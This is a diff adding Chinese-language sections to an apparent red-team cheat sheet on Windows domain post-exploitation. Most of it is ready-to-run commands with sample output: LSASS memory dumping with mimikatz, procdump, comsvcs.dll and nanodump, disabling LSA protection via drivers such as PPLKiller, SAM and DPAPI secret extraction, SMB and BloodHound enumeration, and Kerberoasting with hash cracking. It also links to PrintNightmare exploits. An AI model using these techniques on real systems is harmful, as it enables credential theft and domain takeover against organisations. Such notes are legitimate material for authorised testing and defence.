@@ -734,5 +734,386 @@ https://github.com/Bdenneu/CVE-2022-33679.git
 ### <span style="color:#F98B26">2.2.1.1 Dump lsass</span>
 
 ```
+凭证转储是攻击者用来破坏基础设施的最常用技术之一.
+它允许窃取敏感的凭证信息,并使攻击者能够在目标环境中进一步横向移动.
+
+负责此操作的进程是lsass.exe,我们需要转储lsass进程的内存.
+```
+
+```
+1. mimikatz
+
+Mimikatz是一种非常流行的后渗透利用工具,可用于转储lsass进程并从中提取NTLM哈希值.
+
+攻击流程:
+
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+```
+
+```
+2. Procdump
+
+Procdump是微软官方的工具,使用该工具可以把lsass的内存dump下来,可以绕过大多数的防护软件.
+lsass进程里面存放着我们登录的账号密码等信息.
+只要登录机器那么lass进程就会记录你的登录凭证,通过lsass我们就能够获取到机器的明文密码和hash.
+
+首先使用procdump将lsaa中的内存dump下来.
+lsass进程获取内存hash,lsass.exe进程会保存机器登录过的用户密码(2008之前密码是明文存储,2012和2016都是密文hash存储)
+
+攻击流程:
+
+procdump64.exe -accepteula -ma lsass.exe lsass.dmp
+```
+
+```
+3. QuarksPwDump
+
+支持Windows XP/2003/Vista/7/2008版本,稳定.
+可抓取windows用户凭据,包括:本地账户,域用户,缓存的域账号和Bitlocker
+
+攻击流程:
+
+quarks-pwdump.exe --dump-hash-local
+```
+
+```
+4. PwDump7
+
+Pwdump7 从文件系统中提取二进制文件SAM和SYSTEM文件来运行,然后提取哈希值.
+
+C:\Users\Administrator\Desktop\pwdump-master>PwDump7.exe
+Pwdump v7.1 - raw password extractor
+Author: Andres Tarasco Acuna
+url: http://www.514.es
+
+Administrator:500:C9A384267FD78F7AFC74BA281EA484BC:6E752C9FD7AA4C144171F043249E5FD4:::
+Guest:501:F7E9D61425661494CF8E483AC94651A3:2B7462EF81B22006487A4E5C356B7D60:::
+:503:40939CB3C5D7FDEBB8862601A69B71E7:2E5FA8499015497AFC6E0A581C6DF3BA:::
+Σ:504:NO PASSWORD*********************:NO PASSWORD*********************:::
+```
+
+```
+5. createdump
+
+https://twitter.com/bopin2020/status/1366400799199272960/photo/1
+https://lolbas-project.github.io/lolbas/OtherMSBinaries/Createdump/
+```
+
+![](../assets/post_img/Snipaste_2024-05-06_17-54-38.png)
+
+```
+6. Avdump
+
+AvDump.exe是Avast杀软自带程序,可用于转储指定进程内存数据,带有Avast杀软数字签名
+https://github.com/f1tz/Misc/tree/master/AvDump
+```
+
+```
+7. DumpMinitool
+
+DumpMinitool.exe --file dump.txt --processId 696 --dumpType Full
+Dump minitool: Started with arguments --file dump.txt --processId 696 --dumpType Full
+Output file: 'dump.txt'
+Process id: 696
+Dump type: Full
+Dumped process.
+
+mimikatz # sekurlsa::minidump C:\Users\Administrator\Desktop\dump.txt
+Switch to MINIDUMP : 'C:\Users\Administrator\Desktop\dump.txt'
+
+mimikatz # sekurlsa::logonpasswords
+```
+
+```
+8. MalSeclogon
+
+https://github.com/antonioCoco/MalSeclogon
+
+MalSeclogon.exe -p 696 -d 1
+Attempt to leak process handles from lsass: 0x03e0 0x05b8 0x0690...
+Lsass dump created with leaked handle! Check the path C:\lsass.dmp
+```
+
+```
+9. comsvcs.dll
+
+rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id Desktop\lsass-comsvcs.dmp full
+```
+
+```
+10. nanodump
+
+https://github.com/fortra/nanodump
+
+nanodump.x64.exe --fork -w lsass.dmp
+The minidump has an invalid signature, restore it running:
+scripts/restore_signature lsass.dmp
+Done, to get the secretz run:
+python3 -m pypykatz lsa minidump lsass.dmp
+mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
+```
+
+### <span style="color:#F98B26">2.2.1.2 绕过LSA防护策略读取密码</span>
+https://itm4n.github.io/lsass-runasppl/
+```
+reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 00000001 /f
+
+C:\Users\Administrator\Desktop>mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::logonpasswords
+ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
+```
+
+```
+绕过LSA保护并转储缓存的票据
+
+删除RunAsPPL 注册表项并再次重新启动系统.
+这不是一个实用的方法,一旦我们重启系统,会丢失缓存在内存上的额所有凭据.
+
+通过修补EPROCESS内核结构来禁用LSASS进程上的PPL标注.
+PPL保护由驻留在与目标进程关联的EPROCESS内核对象中的位控制.
+如果我们能够在内核空间中获得代码执行,我们就可以禁用LSA保护并转储凭据.
+
+直接读取LSASS进程内存内容,而不是使用打开的进程函数.
+```
+
+```
+采用操作SAM的方式 获取凭据
+
+mimikatz # privilege::debug
+mimikatz # token::elevate
+mimikatz # lsadump::sam
+```
+
+```
+1. mimikatz驱动加载
+
+通过加载驱动来移除 Lsa Protection,mimikatz提供Mimidrv.sys驱动,
+Mimidrv.sys已经签名的Windows驱动模型(WDM)内核模式软件驱动程序.
+
+mimikatz # privilege::debug
+mimikatz # !+
+mimikatz # !processprotect /process:lsass.exe /remove
+```
+
+```
+2. PPLKiller
+
+https://github.com/RedCursorSecurityConsulting/PPLKiller
+
+PPLKiller.exe /installDriver
+PPLKiller.exe /disableLSAProtection
+```
+
+### <span style="color:#F98B26">2.2.1.3 查看本地存储的所有密码</span>
+
+```
+SAM是管理所有用户账号及其密码的安全账户管理器的缩写.
+它充当数据库.
+所有密码都经过哈希处理,然后存储为SAM.
+LSA负责通过将密码与SAM中维护的数据库进行匹配来验证用户登录.
+
+Windows启动后,SAM即开始在后台运行.
+SAM位于C:\Windows\System32\config 中,散列并保存在SAM中的密码可以在注册表中找到,只需打开注册表编辑器并导航到
+HKEY_LOCAL_MACHINE\SAM即可.
+```
+
+```
+1. mimikatz
+
+要想从SECURITY 和SAM配置单元文件中获得凭据,
+可以使用mimikatz从内存中读取它们.
+
+首先,执行token::elevate获得一个SYSTEM会话,
+这样就可以读取凭据了.
+
+如果需要的话,还要执行privilege::debug 命令来授予SeDebugPrivilege权限.
+
+攻击流程:
+
+mimikatz # privilege::debug
+mimikatz # token::elevate
+mimikatz # lsadump::sam
+```
+
+```
+2. Reg save命令
+
+https://www.praetorian.com/blog/how-to-detect-and-dump-credentials-from-the-windows-registry/
+https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets
+
+首先,需要转储注册表的配置单元.
+为此,需要借助于SECURITY和SAM配置单元以及SYSTEM配置单元,
+因为其中包含系统Boot Key (或System Key),可用于解密SECURITY和SAM配置单元
+
+reg save HKLM\SYSTEM system.bin
+reg save HKLM\SECURITY security.bin
+reg save HKLM\SAM sam.bin
+
+使用secretsdump进行转储:
+
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.bin -system system.bin -security security.bin LOCAL
+```
+
+### <span style="color:#F98B26">2.2.1.4 DPAPI解密</span>
+
+```
+DPAPI提供了一组简单的API,可以使用绑定到特定用户或系统的隐士加密秘钥轻松加密和解密不透明数据.
+这允许应用程序保护用户数据,而不必担心秘钥管理之类的事情.
+
+对于windows系统,用户的加密数据大都采用DPAPI进行存储,而不需要解密这些数据,必须要获得DPAPI对应的
+Masterkey.
+```
+
+```
+mimikatz获取:
+
+通过读取lsass进程信息,获取当前系统中的Masterkey,能获得多个Master key file对应的Masterkey
+
+mimikatz # privilege::debug
+mimikatz # sekurlsa::dpapi
+```
+
+https://ad-lab.gitbook.io/building-a-windows-ad-lab/vulnerabilities-and-misconfigurations-and-attacks/misc/different-methods-of-dumping-credentials/page-3
+
+```
+离线获取
+
+reg save HKLM\SYSTEM system.bin
+reg save HKLM\SECURITY security.bin
+
+
+
+lsadump::secrets /system:system.bin /security:security.bin
+```
+
+```
+待研究
+```
+
+### <span style="color:#F98B26">2.2.2 普通域用户</span>
+### <span style="color:#F98B26">2.2.2.1 枚举SMB共享</span>
+
+```
+SMB 全称是 Server Message Block(服务器消息块)，又称网络文件共享系统，是一种应用层网络传输协议
+SMB 被广泛地应用于在计算机间共享文件、端口、命名管道和打印机等
+系统上的不同应用程序可以同时读取和写入文件，并向服务器请求服务
+
+此外，SMB可以直接在 TCP/IP 或其他网络协议上运行
+通过 SMB，用户或任何经授权的应用程序都可以访问远程服务器上的文件或其他资源，并且可以执行读取、创建和更新数据等操作
+
+通常，服务器上有 SMB 共享驱动器，可以连接到该驱动器并用于查看或传输文件
+接下来介绍接种方法来进行枚举域控的 smb 共享
+```
+
+```
+1. crackmapexec
+
+crackmapexec (CME) 是一款后渗透利用工具，可帮助自动化大型活动目录(AD)网络安全评估任务
+
+crackmapexec smb 192.168.0.56 -u fsociety -p P@ssw0rd --shares
+```
+
+![](../assets/post_img/Snipaste_2024-05-07_00-51-28.png)
+
+```
+2. smbclient
+
+smbclient 工具可以用于访问和操作共享文件夹、上传和下载文件，以及执行各种与 SMB 协议相关的操作
+它可以通过命令行界面(CLI)进行操作，并提供了多种选项和参数，使用户能够定制其行为以满足特定需求
+
+smbclient -L 192.168.0.56 -U fsociety --password P@ssw0rd
+```
+
+![](../assets/post_img/Snipaste_2024-05-07_00-54-07.png)
+
+### <span style="color:#F98B26">2.2.2.2 域信息收集</span>
+
+```
+1. BloodHound
+
+攻击者可以使用 BloodHound 轻松识别原本无法快速识别的高度复杂的攻击路径
+防御者可以使用 BloodHound 来识别并消除这些相同的攻击路径
+
+蓝队和红队都可以使用 BloodHound 轻松深入地了解 Active Directory 或 Azure 环境中的权限关系
+```
+
+```
+SharpHound.exe -c all
+```
+
+![](../assets/post_img/Snipaste_2024-05-07_01-05-20.png)
+
+```
+2. Adexplorer
+
+Active Directory Explorer(AD Explorer)是微软的一款域内信息查询工具，它是独立的可执行文件，无需安装
+它能够列出域组织架构、用户账号、计算机账号等，它可以帮助你寻找特权用户和数据库服务器等敏感目标
+
+ADExplorer64.exe -snapshot "" result.dat /accepteula
+
+将Adexplorer导出的快照文件可以使用ADExplorerSnapshot.py工具转换为 json 格式的文件导入到 bloodhound(v4,2 版本以上)中进行图形化分析
+```
+
+```
+python3 ADExplorerSnapshot.py result.dat -o result
+```
+
+### <span style="color:#F98B26">2.2.2.3 kerberoasting 攻击</span>
+https://www.netwrix.com/cracking_kerberos_tgs_tickets_using_kerberoasting.html
+```
+漏洞原理:
+
+当域内用户去请求域内某个服务资源时，先会通过 AS 进行身份认证，通过后会返回一个用用户密码 hash 加密的 TGT 给用户，用户拿着 TGT 向 TGS 去请求，TGS 会返回一个用对应服务账号的密码 hash 加密过的专门用于访问特定服务的服务票据回来，只要用户提供的票据正确，服务就会返回自身 hash 加密的tgs 票据
+
+那么如果我们有一个域用户，就可以申请服务的 tgs 票据，本地爆破服务 hash 得到服务密码，kerberos 协议使用的加密可以使用 y=f(x,key)来表示，算法f为已知的对称加密算法如 rc4_hmac_nt，密钥 key 为 ntlm 值，待加密数据x为用户名，主机 IP，和当前时间戳等，当获取到y即加密后的数据(tgs 票据)，即可爆破密钥，密钥越简单，被破解的几率越大，这个过程叫做 Kerberoasting
+```
+
+```
+python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py blackops.local/fsociety:P@ssw0rd -dc-ip 192.168.0.56 -request
+
+hashcat -m 13100 -o cracked.txt -a 0 Hash.txt wordlist.txt
+```
+
+### <span style="color:#F98B26">2.2.2.4 ms14-068</span>
+
+```
+Kerberos域用户提权漏洞(MS14-068，CVE-2014-6324)，影响版本 Windows Server2003、Windows Server 2008、Windows Server 2008 R2、Windows Server 2012 和 WindowsServer 2012 R2
+```
+
+https://0range-x.github.io/2021/09/25/MS14-068%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/
+
+### <span style="color:#F98B26">2.2.2.5 printnightmare 漏洞</span>
+https://itm4n.github.io/printnightmare-exploitation/
+https://www.thehacker.recipes/ad/movement/print-spooler-service/printnightmare
+
+```
+CVE-2021-1675/CVE-2021-34527 PrintNightmare 是 RpcAddPrinterDriver 中的一个漏洞
+该漏洞用于允许远程打印和驱动程序安装
+
+该函数旨在为具有Windows 特权 SeLoadDriverPrivilege 的用户提供向远程打印池添加驱动程序的能力
+这个权限通常保留给内置 Administrators 组和可能有合法需要在远程终端用户机器上安装打印机驱动程序的 Print Operators 组的用户
+
+这个漏洞允许任何经过身份验证的用户在没有上述特权的情况下向 Windows 系统添加打印驱动程序，从而使攻击者能够在受影响的系统上完全远程执行代码，权限为 SYSTEM
+
+该漏洞影响了所有受支持的 Windows 版本，由于打印机默认在域控制器、Windows7和 10上运行
+并且通常在 Windows 服务器上启用，因此存在广泛的攻击面
+```
+https://github.com/calebstewart/CVE-2021-1675
+
+### <span style="color:#F98B26">2.2.2.6 NTLM Relay</span>
+
+```
 
 ```
